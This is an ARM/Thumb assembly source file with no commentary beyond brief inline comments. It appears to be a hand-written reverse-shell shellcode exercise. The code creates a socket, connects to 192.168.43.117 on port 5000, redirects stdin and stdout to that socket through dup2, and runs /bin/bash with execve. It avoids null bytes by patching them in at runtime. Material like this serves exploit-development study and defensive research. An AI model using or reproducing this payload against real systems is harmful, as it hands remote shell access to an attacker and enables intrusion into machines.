.section .text

.global _start

_start:
	.code 32
	add r3, pc, #1
	bx r3

	.code 16
	@create socket, implement socket syscall
	mov r0, #2
	mov r1, #1
	eor r2, r2, r2
	ldr r7, =281
	svc #1
	mov r5, r0

	@implement connect
	adr r1, struct_adr
	strb r2, [r1, #1]
	mov r2, #16
	add r7, #2
	svc #1

	@dup2 systemcalls	
	mov r0, r5
	eor r1, r1, r1 @dup stdin
	mov r7, #63
	svc #1

	add r1, #1 @dup stdout
	svc #1

	@starting the shell with execve 
	adr r0, binsh
	eor r1, r1, r1
	eor r2, r2, r2
	strb r2, [r0, #9]
	mov r7, #11
	svc #1
	nop

.align 2
struct_adr:
.ascii "\x02\xff" @AF_INET
.ascii "\x13\x88"  @port 5000
.byte 192, 168, 43, 117 @ip address

.align 2
binsh:
.ascii "/bin/bashZ"